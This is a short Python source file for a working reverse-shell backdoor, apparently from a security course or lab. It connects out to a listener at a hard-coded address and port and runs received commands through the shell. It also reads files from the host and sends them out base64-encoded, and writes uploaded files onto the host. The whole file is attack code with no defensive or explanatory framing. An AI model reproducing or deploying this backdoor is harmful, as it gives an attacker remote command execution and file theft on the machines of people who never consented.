import socket, json, os, base64
import subprocess
from json.decoder import JSONDecodeError


class Backdoor:
	def __init__(self,ip,port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip,port))

	def reliable_send(self, data):
		json_data = json.dumps(data.decode())
		self.connection.send(json_data.encode())

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data += self.connection.recv(1024).decode()
				return json.loads(json_data)

			except JSONDecodeError:
				continue

	def change_directory(self,path):
		os.chdir(path)
		return ("[+] Change directory to "+ path).encode()

	def read_file(self,path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	def write_file(self,path,content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload Complete.".encode()

	def execute_command(self, command):
		return subprocess.check_output(command,shell=True)

	def run(self):
		while True:
			command = self.reliable_receive()
			try:
				if command[0] == "exit":
					self.connection.close()
					exit()
				elif command[0] == "cd" and len(command)>1:
					command_result = self.change_directory(command[1])
				elif command[0] == "download":
					command_result = self.read_file(command[1])
				elif command[0]=="upload":
					command_result = self.write_file(command[1],command[2])
				else:
					command_result = self.execute_command(command)
			except Exception:
				command_result = "[-] Error during command execution.".encode()


			self.reliable_send(command_result)


backdoor = Backdoor("10.0.10.4", 4444) ## Change the ip of the listener machine and port no.
backdoor.run()